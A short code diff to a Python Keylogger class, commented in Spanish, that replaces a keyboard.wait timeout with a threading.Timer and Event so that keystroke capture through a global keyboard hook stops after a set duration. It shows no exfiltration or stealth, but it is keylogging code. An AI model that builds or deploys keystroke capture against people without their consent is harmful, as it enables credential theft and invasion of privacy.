@@ -96,12 +96,18 @@ class Keylogger:
         self.start_time = datetime.now()
         
         try:
+            # Evento para controlar la duración de la captura
+            stop_event = threading.Event()
+
             # Registrar el hook de teclado
             keyboard.on_press(self._on_key_event)
-            
-            # Esperar la duración indicada
-            keyboard.wait(timeout=duration)
-            
+
+            # Esperar la duración indicada mediante un timer
+            timer = threading.Timer(duration, stop_event.set)
+            timer.start()
+            stop_event.wait()
+            timer.cancel()
+
             # Detener captura
             keyboard.unhook_all()
             self.is_running = False
